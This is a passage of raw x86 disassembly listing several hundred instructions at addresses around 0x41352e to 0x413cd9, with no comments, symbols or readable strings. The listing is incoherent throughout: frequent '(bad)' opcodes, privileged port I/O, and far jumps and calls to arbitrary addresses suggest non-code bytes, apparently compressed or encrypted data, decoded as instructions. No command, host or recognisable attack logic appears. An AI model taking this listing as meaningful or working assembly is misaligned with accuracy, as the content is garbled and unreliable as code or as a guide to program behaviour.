  41352e:	out    dx,al
  41352f:	fdiv   DWORD PTR [ecx]
  413531:	stos   DWORD PTR es:[edi],eax
  413532:	popf   
  413533:	xor    BYTE PTR [edi+0x53],bl
  413536:	dec    edx
  413537:	jge    0x41359b
  413539:	lahf   
  41353a:	and    BYTE PTR [edi-0x69],bl
  41353d:	and    eax,0x9f8052b5
  413542:	mov    ch,0xd4
  413544:	inc    edx
  413545:	(bad)  
  413546:	dec    dh
  413548:	(bad)  
  413549:	jmp    0x1a573b38
  41354e:	cmp    BYTE PTR [ebp+0x4a],dh
  413551:	mov    al,ds:0xb13294c8
  413556:	ins    DWORD PTR es:[edi],dx
  413557:	cmp    al,0x63
  413559:	sbb    bh,BYTE PTR [edi-0x43]
  41355c:	cs sub eax,0x4b2ab203
  413562:	mov    bh,0x42
  413564:	jmp    0xe2fc7629
  413569:	xchg   ebp,eax
  41356a:	popa   
  41356b:	stos   DWORD PTR es:[edi],eax
  41356c:	clc    
  41356d:	sbb    eax,DWORD PTR [ebp+0x25]
  413570:	sbb    al,0x27
  413572:	dec    edx
  413573:	or     ah,BYTE PTR [eax]
  413575:	pop    ebp
  413576:	ret    0xb481
  413579:	mov    eax,0x185fb943
  41357e:	gs mov dh,bl
  413581:	push   ebp
  413582:	mov    ecx,0xce1537d2
  413587:	and    BYTE PTR [edi],bl
  413589:	xchg   DWORD PTR [ebp+0x3a5da25d],ebx
  41358f:	or     edx,esi
  413591:	cld    
  413592:	mov    edx,0x1530fea2
  413597:	jbe    0x413557
  413599:	sub    bh,BYTE PTR [edi]
  41359b:	mov    dh,0xb
  41359d:	scas   al,BYTE PTR es:[edi]
  41359e:	dec    edi
  41359f:	xor    cl,BYTE PTR [ecx-0x279cbbf8]
  4135a5:	stos   BYTE PTR es:[edi],al
  4135a6:	push   edx
  4135a7:	adc    edx,DWORD PTR [edx-0x4d8e110f]
  4135ad:	cmp    ebp,DWORD PTR [edi+0x7c9ea36a]
  4135b3:	jmp    0x413628
  4135b5:	and    esp,edi
  4135b7:	fs inc edx
  4135b9:	pop    ds
  4135ba:	dec    edi
  4135bb:	and    DWORD PTR [eax],edi
  4135bd:	mov    bl,0x48
  4135bf:	idiv   DWORD PTR [edi]
  4135c1:	pop    ecx
  4135c2:	sbb    bh,bl
  4135c4:	xlat   BYTE PTR ds:[ebx]
  4135c5:	mov    dh,0xce
  4135c7:	mov    cl,0xfa
  4135c9:	out    dx,al
  4135ca:	ins    BYTE PTR es:[edi],dx
  4135cb:	cli    
  4135cc:	mov    ds:0x1df5fb3e,eax
  4135d1:	or     eax,0x3e695a30
  4135d6:	lea    eax,[ebp+0x318283dc]
  4135dc:	mov    bl,0xf9
  4135de:	sub    BYTE PTR [edi+0x7fbf2d5b],0x59
  4135e5:	lods   al,BYTE PTR ds:[esi]
  4135e6:	adc    ch,0x8d
  4135e9:	ss mov ch,0x3c
  4135ec:	test   BYTE PTR [ebx+0x7a950d90],ah
  4135f2:	scas   eax,DWORD PTR es:[edi]
  4135f3:	in     eax,0xda
  4135f5:	pusha  
  4135f6:	pop    esi
  4135f7:	popf   
  4135f8:	sub    DWORD PTR [edi+0x3],ecx
  4135fb:	sar    DWORD PTR [edx+0x5f],cl
  4135fe:	cmp    eax,0xcaea1fbe
  413603:	xor    cl,BYTE PTR [ecx+0x79]
  413606:	(bad)  
  413607:	fbstp  TBYTE PTR [esi+ebx*1-0x3d64b187]
  41360e:	cmp    eax,0xf4056af
  413613:	xor    edi,DWORD PTR [ebx]
  413615:	rol    esp,0xea
  413618:	pop    edi
  413619:	imul   edx,ebp,0x49
  41361c:	fisubr DWORD PTR [edi+0x50]
  41361f:	pop    esi
  413620:	and    esi,ecx
  413622:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413624:	mov    eax,0x99128683
  413629:	lods   eax,DWORD PTR ds:[esi]
  41362a:	div    BYTE PTR [ebx-0xd]
  41362d:	stos   BYTE PTR es:[edi],al
  41362e:	adc    ax,0xc303
  413632:	shr    DWORD PTR [edi-0x6af39fcf],cl
  413638:	pusha  
  413639:	inc    eax
  41363a:	mov    ds:0xd6490a16,al
  41363f:	shl    edx,cl
  413641:	push   edi
  413642:	pop    ds
  413643:	and    bx,bp
  413646:	int    0xa6
  413648:	inc    ebp
  413649:	pushf  
  41364a:	push   ds
  41364b:	add    eax,DWORD PTR [eax+ecx*1-0x2a]
  41364f:	fmul   DWORD PTR [ebx]
  413651:	jae    0x413624
  413653:	fadd   QWORD PTR [eax-0x33c3f48d]
  413659:	cmp    BYTE PTR [ecx+0x4],ch
  41365c:	cld    
  41365d:	push   edi
  41365e:	rol    BYTE PTR [ebx-0x43],cl
  413661:	pop    edx
  413662:	ss daa 
  413664:	or     edx,DWORD PTR [eax+0x3fefc75f]
  41366a:	pushf  
  41366b:	(bad)  
  41366c:	popf   
  41366d:	push   esp
  41366e:	mov    al,0x5b
  413670:	xchg   ebx,eax
  413671:	adc    ebx,esp
  413673:	sub    dh,BYTE PTR [ecx]
  413675:	mov    ds:0xac18363e,al
  41367a:	(bad)
  41367d:	sub    eax,0x3b42a233
  413682:	ss xchg ebp,eax
  413684:	xchg   ecx,eax
  413685:	(bad)  
  413686:	into   
  413687:	sub    bh,cl
  413689:	ja     0x4136dc
  41368b:	shl    BYTE PTR [ebp+0x5b35631a],cl
  413691:	(bad)  
  413692:	iret   
  413693:	and    ebp,DWORD PTR [eax]
  413695:	pop    eax
  413696:	retf   0x9fff
  413699:	sahf   
  41369a:	cmp    al,0x97
  41369c:	pop    edx
  41369d:	js     0x413694
  41369f:	push   eax
  4136a0:	adc    al,0x1
  4136a2:	lods   al,BYTE PTR ds:[esi]
  4136a3:	ja     0x4136c2
  4136a5:	pop    esi
  4136a6:	mov    ds:0x49bbdcdc,al
  4136ab:	pushf  
  4136ac:	daa    
  4136ad:	icebp  
  4136ae:	popf   
  4136af:	xchg   esp,eax
  4136b0:	inc    edx
  4136b1:	push   ebx
  4136b2:	nop
  4136b3:	xchg   ecx,eax
  4136b4:	and    cl,al
  4136b6:	sahf   
  4136b7:	out    dx,al
  4136b8:	add    ch,BYTE PTR [ebp+0x57]
  4136bb:	rcl    DWORD PTR [eax+0x4d],1
  4136be:	xchg   ebx,esi
  4136c0:	sub    eax,0x92b16a7c
  4136c5:	or     esi,DWORD PTR [edi]
  4136c7:	gs cld 
  4136c9:	ret    
  4136ca:	xchg   BYTE PTR [ebx],al
  4136cc:	rcl    esp,0x2c
  4136cf:	fldenv [esi]
  4136d1:	outs   dx,BYTE PTR ds:[esi]
  4136d2:	mov    esi,0x355deb5d
  4136d7:	fcmovb st,st(1)
  4136d9:	arpl   WORD PTR [ebp+ecx*1+0x1f9dc784],cx
  4136e0:	arpl   WORD PTR [edx],bp
  4136e2:	push   es
  4136e3:	ins    BYTE PTR es:[edi],dx
  4136e4:	fucomi st,st(4)
  4136e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e7:	(bad)  
  4136e8:	std    
  4136e9:	mov    ds:0x3cd50531,eax
  4136ee:	mov    edi,0x755c407f
  4136f3:	iret   
  4136f4:	dec    ebx
  4136f5:	sbb    eax,ecx
  4136f7:	enter  0x5b3d,0x75
  4136fb:	les    esi,FWORD PTR [edx]
  4136fd:	and    eax,0x5f5b3432
  413702:	dec    eax
  413703:	jno    0x41376d
  413705:	dec    esi
  413706:	pop    ebp
  413707:	std    
  413708:	test   al,0xe7
  41370a:	inc    esi
  41370b:	xchg   BYTE PTR [eax],bl
  41370d:	cmp    dl,BYTE PTR [esi+0x71c87a23]
  413713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413714:	scas   eax,DWORD PTR es:[edi]
  413715:	popa   
  413716:	test   BYTE PTR [esi],0xac
  413719:	int    0xce
  41371b:	adc    BYTE PTR [ebx-0x6ba165ab],bh
  413721:	lods   al,BYTE PTR ds:[esi]
  413722:	mov    esi,ecx
  413724:	inc    esi
  413725:	mov    bl,0x7b
  413727:	cld    
  413728:	je     0x413758
  41372a:	and    edx,DWORD PTR [eax-0x1c]
  41372d:	jle    0x413725
  41372f:	jmp    0x413712
  413731:	pop    ebx
  413732:	cmp    bl,cl
  413734:	(bad)  
  413735:	sti    
  413736:	aad    0xf9
  413738:	jne    0x413764
  41373a:	or     al,0x12
  41373c:	int3   
  41373d:	(bad)  
  41373e:	popa   
  41373f:	mov    ecx,ecx
  413741:	pop    ebx
  413742:	fwait
  413743:	xor    dl,BYTE PTR [esi+eax*1-0x22]
  413747:	outs   dx,DWORD PTR ds:[esi]
  413748:	adc    eax,0x6275298d
  41374d:	out    0xb2,al
  41374f:	stos   DWORD PTR es:[edi],eax
  413750:	arpl   WORD PTR [edi+0x59dfe288],si
  413756:	and    BYTE PTR [esp+ebp*8],dh
  413759:	stc    
  41375a:	outs   dx,DWORD PTR ds:[esi]
  41375b:	cmp    BYTE PTR [esi],al
  41375d:	xor    bh,al
  41375f:	mov    ss,WORD PTR [edx-0x6a]
  413762:	push   edx
  413763:	jbe    0x41373c
  413765:	and    eax,0xb7b8957e
  41376a:	scas   eax,DWORD PTR es:[edi]
  41376b:	jne    0x413764
  41376d:	mov    ecx,0x308202f3
  413772:	cmp    ch,BYTE PTR [ebp+0xa]
  413775:	adc    eax,0x5d027c43
  41377a:	push   ebx
  41377b:	les    esp,FWORD PTR [ecx-0x54]
  41377e:	pusha  
  41377f:	call   0xdeecfa95
  413784:	pop    esp
  413785:	inc    ebp
  413786:	pop    edi
  413787:	fdiv   DWORD PTR [ebx-0xa]
  41378a:	enter  0x1f26,0xcb
  41378e:	into   
  41378f:	push   ds
  413790:	rcl    BYTE PTR [esi+ebx*4-0x680e23d4],0x74
  413798:	fistp  DWORD PTR [eax-0x3b]
  41379b:	in     eax,dx
  41379c:	fwait
  41379d:	cmp    al,BYTE PTR [edi]
  41379f:	sbb    al,0xfc
  4137a1:	aas    
  4137a2:	push   es
  4137a3:	fld    TBYTE PTR [ebx*1+0x656ec12e]
  4137aa:	xor    al,0x5f
  4137ac:	mov    eax,ds:0x43a72efa
  4137b1:	mov    ch,0x28
  4137b3:	std    
  4137b4:	mov    dh,0xd1
  4137b6:	ds cmc 
  4137b8:	pushf  
  4137b9:	mov    eax,es:0xb2c505c2
  4137bf:	js     0x413815
  4137c1:	inc    esp
  4137c2:	sub    esp,DWORD PTR [ebx+0x7d]
  4137c5:	out    dx,eax
  4137c6:	sbb    al,0xda
  4137c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137c9:	sbb    al,0xc5
  4137cb:	ror    DWORD PTR [eax-0x5e975928],cl
  4137d1:	cmp    DWORD PTR [eax],edi
  4137d3:	aad    0xaa
  4137d5:	mov    ?,esi
  4137d7:	ins    BYTE PTR es:[edi],dx
  4137d8:	add    eax,ebp
  4137da:	ret    0x9bde
  4137dd:	jae    0x413777
  4137df:	and    eax,0x9f61d640
  4137e4:	(bad)  
  4137e5:	pop    esp
  4137e6:	inc    ecx
  4137e7:	(bad)  
  4137e8:	xchg   ebp,eax
  4137e9:	dec    esi
  4137ea:	mov    esp,edx
  4137ec:	ins    BYTE PTR es:[edi],dx
  4137ed:	push   DWORD PTR fs:[ebp+0x70]
  4137f1:	jne    0x413807
  4137f3:	loop   0x41383b
  4137f5:	jge    0x4137c1
  4137f7:	push   0xffffff8f
  4137f9:	stos   BYTE PTR es:[edi],al
  4137fa:	mov    ebp,0xf6028c1a
  4137ff:	std    
  413800:	ss push eax
  413802:	dec    ebp
  413803:	xor    DWORD PTR [ecx+0x57],ebp
  413806:	ficom  WORD PTR [edx+0x78f1eb9e]
  41380c:	fiadd  WORD PTR [ecx]
  41380e:	pop    fs
  413810:	arpl   WORD PTR [ecx+0x54],cx
  413813:	pop    esi
  413814:	jnp    0x413827
  413816:	ret    0xe50b
  413819:	arpl   ax,cx
  41381b:	retf   
  41381c:	mov    bh,0x2
  41381e:	and    eax,0xb1e8ea7f
  413823:	push   eax
  413824:	and    BYTE PTR gs:[edi],0xdf
  413828:	rol    BYTE PTR [edx+0x4566bac4],1
  41382e:	retf   0x6f02
  413831:	dec    ebp
  413832:	pop    es
  413833:	mov    dl,BYTE PTR [ecx-0x1]
  413836:	repz cmp al,0xf2
  413839:	outs   dx,BYTE PTR ds:[esi]
  41383a:	pop    ecx
  41383b:	jge    0x413839
  41383d:	inc    ecx
  41383e:	sbb    bh,BYTE PTR [ecx+0x62]
  413841:	sbb    eax,0x2c83f47d
  413846:	xlat   BYTE PTR ds:[ebx]
  413847:	jl     0x41382c
  413849:	and    BYTE PTR [ecx+ebx*4],ah
  41384c:	sub    eax,0x194e6916
  413851:	out    0x84,al
  413853:	inc    esi
  413854:	mov    WORD PTR ds:0x1031526d,es
  41385a:	xor    eax,DWORD PTR [ecx-0x68]
  41385d:	ret    
  41385e:	sbb    DWORD PTR [ecx+0x5c],ebp
  413861:	lea    ebx,[esi+0x7a356112]
  413867:	mov    dl,0xc1
  413869:	je     0x41388c
  41386b:	bound  edi,QWORD PTR [edi]
  41386d:	mov    ds:0x6ba76824,al
  413872:	mov    cl,0x7b
  413874:	mov    ds:0x16f5cbfe,al
  413879:	dec    ebp
  41387a:	pop    ebp
  41387b:	push   cs
  41387c:	push   eax
  41387d:	pop    ecx
  41387e:	lock push ss
  413880:	clc    
  413881:	push   es
  413882:	dec    edx
  413883:	mov    edx,0x3b57205d
  413888:	and    DWORD PTR [edx+0x8f2c189],esi
  41388e:	jl     0x41387c
  413890:	aad    0x70
  413892:	push   ebx
  413893:	mov    cl,0x7e
  413895:	mov    ebp,DWORD PTR [ecx+0x36]
  413898:	cmovl  edx,DWORD PTR ds:0x6a6178d2
  41389f:	mov    ch,0xe1
  4138a1:	push   cs
  4138a2:	jb     0x413919
  4138a4:	jne    0x41386b
  4138a6:	loope  0x413904
  4138a8:	shl    BYTE PTR [edx-0x29],0x1b
  4138ac:	mov    bh,0x28
  4138ae:	mov    al,0xf1
  4138b0:	into   
  4138b1:	xlat   BYTE PTR ds:[ebx]
  4138b2:	push   es
  4138b3:	cmp    eax,0x5e5eaad5
  4138b8:	jnp    0x4138d3
  4138ba:	pop    ebp
  4138bb:	das    
  4138bc:	imul   esi,DWORD PTR [ecx+0x9],0xf57f7119
  4138c3:	jno    0x413872
  4138c5:	ja     0x4138a7
  4138c7:	mov    dl,0xe4
  4138c9:	outs   dx,BYTE PTR ds:[esi]
  4138ca:	scas   eax,DWORD PTR es:[edi]
  4138cb:	mov    dl,BYTE PTR [edx-0x23f665d4]
  4138d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d2:	xchg   ecx,eax
  4138d3:	retf   0x5a22
  4138d6:	and    al,0x2f
  4138d8:	in     al,0xe
  4138da:	inc    edx
  4138db:	retf   
  4138dc:	lea    ebx,[eax+0x74ac121d]
  4138e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138e3:	loopne 0x413958
  4138e5:	add    ecx,DWORD PTR ds:[esi-0x33]
  4138e9:	sti    
  4138ea:	or     ch,dh
  4138ec:	popf   
  4138ed:	sti    
  4138ee:	sub    BYTE PTR [ecx+0x46],bl
  4138f1:	fxam   
  4138f3:	lds    edx,FWORD PTR [esi]
  4138f5:	jns    0x413971
  4138f7:	mov    al,ds:0xd21324e0
  4138fc:	sti    
  4138fd:	push   eax
  4138fe:	out    dx,al
  4138ff:	adc    edi,0xffffffb4
  413902:	sub    BYTE PTR [ebx+edx*1-0x5eb21b2c],bh
  413909:	mov    ah,BYTE PTR [edi]
  41390b:	(bad)  
  41390c:	cmc    
  41390d:	loope  0x41397c
  41390f:	inc    ecx
  413910:	leave  
  413911:	mov    al,0x7b
  413913:	lock inc ebp
  413915:	sar    BYTE PTR [eax+0x42346881],1
  41391b:	cs sub al,0x11
  41391e:	adc    al,0xe1
  413920:	pop    eax
  413921:	popa   
  413922:	or     DWORD PTR [ecx+0x79],ebx
  413925:	sbb    al,BYTE PTR [edi+0x63]
  413928:	cmp    BYTE PTR [ebx+eax*2-0x53eee7d8],bh
  41392f:	gs push es
  413931:	jmp    0x41395f
  413933:	sbb    eax,0x6e580edf
  413938:	adc    bh,BYTE PTR [ecx]
  41393a:	adc    edi,edi
  41393c:	test   ecx,esp
  41393e:	out    0xef,al
  413940:	xor    DWORD PTR [eax+0x2f2e3b2d],edi
  413946:	icebp  
  413947:	add    BYTE PTR [ecx],dh
  413949:	and    BYTE PTR [esi+0x61],ch
  41394c:	imul   ebx,edi,0xffffff92
  41394f:	addr16 push ebx
  413951:	daa    
  413952:	fisubr WORD PTR [esi+edi*8+0x10859c83]
  413959:	cmc    
  41395a:	mov    dl,0xa9
  41395c:	mov    eax,0x791a5427
  413961:	test   eax,0xa0dbcccb
  413966:	int    0x2d
  413968:	ins    BYTE PTR es:[edi],dx
  413969:	or     edi,DWORD PTR [ecx-0x4180e653]
  41396f:	mov    edi,0x7ecc30f6
  413974:	shr    BYTE PTR [ecx-0x78daf441],0x67
  41397b:	sub    eax,0x386d449e
  413980:	push   esp
  413981:	inc    ebx
  413982:	sub    ecx,DWORD PTR [edx+0x6fdd8ab0]
  413988:	ficom  DWORD PTR [edi+eiz*2-0x6daf728b]
  41398f:	in     eax,0x7
  413991:	fst    DWORD PTR [esi+0x3fa28da6]
  413997:	xchg   ebx,eax
  413998:	pop    es
  413999:	test   BYTE PTR [ebx+edi*2-0x27],bl
  41399d:	pop    esp
  41399e:	add    ebp,DWORD PTR [edx]
  4139a0:	ret    
  4139a1:	aaa    
  4139a2:	ror    bl,0x3d
  4139a5:	(bad)  
  4139a6:	cmp    eax,0x3da119c5
  4139ab:	or     al,0x11
  4139ad:	cmp    DWORD PTR [ebx-0x30bc6351],0xd5f4900e
  4139b7:	fistp  WORD PTR [edi+eax*2-0x1c]
  4139bb:	scas   al,BYTE PTR es:[edi]
  4139bc:	add    al,0x4a
  4139be:	mov    ecx,0x3773ff7b
  4139c3:	cs jb  0x413a15
  4139c6:	adc    ch,bl
  4139c8:	xor    DWORD PTR [eax+ebx*8+0x6f],ebx
  4139cc:	ins    BYTE PTR es:[edi],dx
  4139cd:	div    BYTE PTR [edi]
  4139cf:	popa   
  4139d0:	shl    DWORD PTR [edx+eax*4+0x425577c4],1
  4139d7:	in     eax,dx
  4139d8:	cli    
  4139d9:	(bad)  
  4139da:	ds sti 
  4139dc:	retf   0x3821
  4139df:	rcr    ah,1
  4139e1:	mov    dh,0x93
  4139e3:	pop    edi
  4139e4:	sbb    DWORD PTR [eax-0x7b],ebp
  4139e7:	dec    ebx
  4139e8:	xchg   ebp,eax
  4139e9:	nop
  4139ea:	fst    DWORD PTR [edx-0xe]
  4139ed:	jo     0x4139ec
  4139ef:	jns    0x413a09
  4139f1:	sti    
  4139f2:	inc    ebp
  4139f3:	popf   
  4139f4:	retf   
  4139f5:	and    al,0x2b
  4139f7:	xor    eax,0x28d5a115
  4139fc:	mov    eax,ds:0xda521e11
  413a01:	push   ss
  413a02:	test   al,0x50
  413a04:	je     0x4139c6
  413a06:	loope  0x41399e
  413a08:	mov    dh,BYTE PTR [eax]
  413a0a:	push   cs
  413a0b:	adc    BYTE PTR [ebx-0x360e1cdf],ch
  413a11:	leave  
  413a12:	cwde   
  413a13:	out    dx,eax
  413a14:	sar    ecx,cl
  413a16:	dec    edi
  413a17:	aam    0x8c
  413a19:	(bad)  
  413a1a:	pop    ebx
  413a1b:	out    dx,al
  413a1c:	pop    esp
  413a1d:	mov    bl,0x27
  413a1f:	jmp    0xcaa7:0x476e776d
  413a26:	hlt    
  413a27:	adc    BYTE PTR [eax-0x1a57ee93],bh
  413a2d:	test   al,0x9a
  413a2f:	and    eax,0xfb426d8e
  413a34:	dec    eax
  413a35:	mov    BYTE PTR [esi+0x580fd611],dl
  413a3b:	shr    edx,0xb1
  413a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a3f:	lock mov eax,DWORD PTR [ebp+ebp*1-0x48]
  413a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a45:	mov    al,0x59
  413a47:	cs push es
  413a49:	push   0x54
  413a4b:	cmp    ebp,ebx
  413a4d:	push   edi
  413a4e:	ss sbb eax,0xee3de90d
  413a54:	or     eax,0xa6cce289
  413a59:	fst    st(7)
  413a5b:	out    dx,eax
  413a5c:	cmp    eax,0xedb2bc90
  413a61:	fwait
  413a62:	mov    ebx,0x17026918
  413a67:	(bad)  
  413a68:	mov    esp,0x5a9bbefb
  413a6d:	sahf   
  413a6e:	push   edx
  413a6f:	mov    ds:0x72ea16e5,eax
  413a74:	mov    cl,0xd9
  413a76:	bound  edx,QWORD PTR [edx]
  413a78:	shl    DWORD PTR [ebx+0x57],0xf9
  413a7c:	jmp    FWORD PTR [edi-0x67]
  413a7f:	dec    ebx
  413a80:	addr16 mov edx,0x51bf1b7d
  413a86:	cmp    eax,0x207c1532
  413a8b:	das    
  413a8c:	adc    DWORD PTR [ebx-0x714f5274],ecx
  413a92:	das    
  413a93:	adc    DWORD PTR [edx],esi
  413a95:	rcl    BYTE PTR [edx],cl
  413a97:	rol    DWORD PTR [esi],cl
  413a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9a:	push   ss
  413a9b:	jl     0x413a2e
  413a9d:	sti    
  413a9e:	sbb    esp,edx
  413aa0:	pushf  
  413aa1:	jae    0x413a64
  413aa3:	pop    ds
  413aa4:	hlt    
  413aa5:	in     eax,0x54
  413aa7:	adc    eax,0xc33084a5
  413aac:	imul   eax,DWORD PTR [edi-0x27ca4265],0xffffffb3
  413ab3:	mov    ah,0x21
  413ab5:	call   0x91c0:0x52b03261
  413abc:	dec    ebx
  413abd:	in     eax,0x97
  413abf:	sub    esp,DWORD PTR [esi-0x2b00f849]
  413ac5:	and    DWORD PTR [eax],edi
  413ac7:	mov    al,0xe5
  413ac9:	jae    0x413a81
  413acb:	nop
  413acc:	push   es
  413acd:	test   al,0x37
  413acf:	jmp    0x98502469
  413ad4:	jp     0x413ab3
  413ad6:	gs sub al,0x2
  413ad9:	xor    ah,BYTE PTR [edi]
  413adb:	cli    
  413adc:	(bad)  
  413add:	mov    ebx,ebp
  413adf:	xor    bh,BYTE PTR [esi+esi*8]
  413ae2:	imul   DWORD PTR [edi]
  413ae4:	pop    edi
  413ae5:	and    edi,edi
  413ae7:	inc    eax
  413ae8:	iret   
  413ae9:	xchg   esi,eax
  413aea:	jge    0x413b5b
  413aec:	mov    dl,0xd8
  413aee:	ror    BYTE PTR [ecx],0xac
  413af1:	push   edx
  413af2:	fs and al,0xd9
  413af5:	sub    al,0x2a
  413af7:	pop    es
  413af8:	call   0xaea0:0x4c991b19
  413aff:	scas   eax,DWORD PTR es:[edi]
  413b00:	add    DWORD PTR [edi-0x7030b33d],eax
  413b06:	sti    
  413b07:	mov    dh,0x6a
  413b09:	jo     0x413b74
  413b0b:	aaa    
  413b0c:	jbe    0x413b01
  413b0e:	and    eax,0x8975f89c
  413b13:	cmp    eax,0x79196d81
  413b18:	add    BYTE PTR [eax],ch
  413b1a:	call   0x29fe:0x27b84202
  413b21:	jmp    0xbe1e7d2b
  413b26:	(bad)  
  413b28:	jae    0x413b07
  413b2a:	dec    edx
  413b2b:	mov    cl,0xa0
  413b2d:	bound  ebp,QWORD PTR [edi+0x1b21b549]
  413b33:	pop    esp
  413b34:	pop    ebx
  413b35:	rcr    BYTE PTR [eax-0x35],0xc9
  413b39:	jmp    WORD PTR [ebp-0x1e]
  413b3d:	lock or DWORD PTR [eax],esp
  413b40:	out    0x6b,al
  413b42:	inc    esp
  413b43:	dec    edx
  413b44:	in     al,dx
  413b45:	pushf  
  413b46:	lahf   
  413b47:	xchg   ecx,eax
  413b48:	call   FWORD PTR [ecx]
  413b4a:	fnstenv [ecx-0x7d]
  413b4d:	data16 jno 0x413adb
  413b50:	jo     0x413b75
  413b52:	adc    dl,bl
  413b54:	push   0xe06b8b7f
  413b59:	inc    esp
  413b5a:	shr    DWORD PTR [edx+ecx*4],1
  413b5d:	xor    eax,0x4bdab1b2
  413b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b63:	ficom  DWORD PTR [eax+edi*1+0x26]
  413b67:	into   
  413b68:	pop    esp
  413b69:	and    DWORD PTR [esi],esp
  413b6b:	(bad)  
  413b6c:	dec    eax
  413b6d:	dec    edx
  413b6e:	call   0xaf23c29e
  413b73:	addr16 push esp
  413b75:	jbe    0x413b0d
  413b77:	clc    
  413b78:	loopne 0x413b7d
  413b7a:	adc    al,0x2e
  413b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b7d:	inc    edi
  413b7e:	or     BYTE PTR [ebp+0x24],bh
  413b81:	xchg   edx,eax
  413b82:	sub    BYTE PTR [ebx-0x6dd4b4dc],0x6
  413b89:	out    dx,al
  413b8a:	xchg   esi,eax
  413b8b:	outs   dx,DWORD PTR ds:[esi]
  413b8c:	xchg   esi,eax
  413b8d:	adc    ebp,DWORD PTR [ebx]
  413b8f:	add    al,0x33
  413b91:	dec    ebx
  413b92:	les    esp,FWORD PTR [eax-0x77]
  413b95:	(bad)  
  413b96:	adc    dl,BYTE PTR [ecx]
  413b98:	mov    BYTE PTR [esi-0x2899078],bl
  413b9e:	cmp    eax,0xc740d06d
  413ba3:	mov    cl,0x9b
  413ba5:	int    0x9e
  413ba7:	push   cs
  413ba8:	fnstsw WORD PTR [ecx+0x17792191]
  413bae:	pop    edx
  413baf:	(bad)  
  413bb0:	xor    al,BYTE PTR [edi-0xd]
  413bb3:	fdivr  QWORD PTR [edx-0x549bc9d4]
  413bb9:	mov    ah,0x1d
  413bbb:	dec    eax
  413bbc:	inc    DWORD PTR [eax-0x21]
  413bbf:	fld    TBYTE PTR [eax]
  413bc1:	(bad)  
  413bc2:	sar    BYTE PTR [edx+0x31],1
  413bc5:	cmp    al,0xb9
  413bc7:	(bad)  
  413bc8:	enter  0xdd74,0x6f
  413bcc:	imul   eax,ebx,0xffffffbd
  413bcf:	mov    DWORD PTR [eax+eiz*4-0x25f7fab9],ebp
  413bd6:	push   es
  413bd7:	test   DWORD PTR [esi],eax
  413bd9:	lods   al,BYTE PTR ds:[esi]
  413bda:	push   edx
  413bdb:	mov    ds:0x64d3127,eax
  413be0:	jg     0x413bfb
  413be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413be3:	xlat   BYTE PTR ds:[ebx]
  413be4:	nop
  413be5:	outs   dx,DWORD PTR ds:[esi]
  413be6:	add    BYTE PTR [eax+0x612bed69],dh
  413bec:	jmp    0x2fe3:0xa9ec1463
  413bf3:	jg     0x413bd1
  413bf5:	(bad)  
  413bf6:	xor    eax,0x5fb32835
  413bfb:	loop   0x413ba2
  413bfd:	lods   al,BYTE PTR ds:[esi]
  413bfe:	xlat   BYTE PTR ds:[ebx]
  413bff:	jae    0x413c04
  413c01:	push   esp
  413c02:	xchg   esp,eax
  413c03:	push   cs
  413c04:	jmp    DWORD PTR [ecx-0xc]
  413c07:	jo     0x413b8f
  413c09:	mov    al,ds:0x8fcebe98
  413c0e:	test   DWORD PTR [eax+0x200b5df3],esp
  413c14:	rep lods al,BYTE PTR ds:[esi]
  413c16:	mov    cl,0x62
  413c18:	into   
  413c19:	repz mov esi,0x3fe58909
  413c1f:	faddp  st(1),st
  413c21:	ret    0x6acb
  413c24:	lds    edi,FWORD PTR [eax+ebp*8-0x277886]
  413c2b:	add    esp,DWORD PTR [edi]
  413c2d:	jo     0x413c31
  413c2f:	mov    ebx,0x1b9057ff
  413c34:	mov    ch,0x50
  413c36:	sti    
  413c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c38:	sbb    al,0xd4
  413c3a:	(bad)  
  413c3b:	mov    esi,0x83d6d8ce
  413c40:	jmp    0x5e11:0xad864ada
  413c47:	jg     0x413c62
  413c49:	(bad)  
  413c4a:	shl    DWORD PTR [ebx+ebp*4+0x17bd143d],1
  413c51:	adc    DWORD PTR [ecx-0x5908078f],esi
  413c57:	enter  0x5222,0xff
  413c5b:	loop   0x413c4c
  413c5d:	bound  edx,QWORD PTR [ebx+ebx*8+0x70615ca8]
  413c64:	imul   ebp,eax,0x22
  413c67:	sbb    ah,dl
  413c69:	jno    0x413cc1
  413c6b:	or     al,BYTE PTR [ecx+0x59]
  413c6e:	sbb    eax,0x4a073656
  413c73:	int3   
  413c74:	adc    eax,0x52bbc758
  413c79:	sub    ebx,DWORD PTR ds:0x8f9f1227
  413c7f:	xchg   ebx,eax
  413c80:	cmp    dh,BYTE PTR [esi+0x4297aae2]
  413c86:	inc    edi
  413c87:	add    eax,0xa93b0de3
  413c8c:	clc    
  413c8d:	ret    0x2c43
  413c90:	add    ebx,DWORD PTR [ecx-0x72567182]
  413c96:	bound  ebx,QWORD PTR [ebp-0x2b195fac]
  413c9c:	mov    ah,BYTE PTR [ebp-0xdf8bc80]
  413ca2:	and    ebx,DWORD PTR [ecx+0x35cc830f]
  413ca8:	(bad)  
  413ca9:	scas   al,BYTE PTR es:[edi]
  413caa:	stc    
  413cab:	es stos BYTE PTR es:[edi],al
  413cad:	sub    esi,DWORD PTR fs:[ebx+0x1698661f]
  413cb4:	sahf   
  413cb5:	gs jo  0x413cfd
  413cb8:	aad    0x7e
  413cba:	retf   0x7315
  413cbd:	ret    0x34be
  413cc0:	shl    DWORD PTR [esi+esi*2-0x11],cl
  413cc4:	test   BYTE PTR [esi],0x79
  413cc7:	mov    ecx,0x42a08733
  413ccc:	push   0x49
  413cce:	mov    al,0xc6
  413cd0:	cmp    al,0x1a
  413cd2:	(bad)  
  413cd3:	or     ebx,DWORD PTR [edi+0x6]
  413cd6:	adc    al,0x1d
  413cd8:	ins    BYTE PTR es:[edi],dx
  413cd9:	daa    
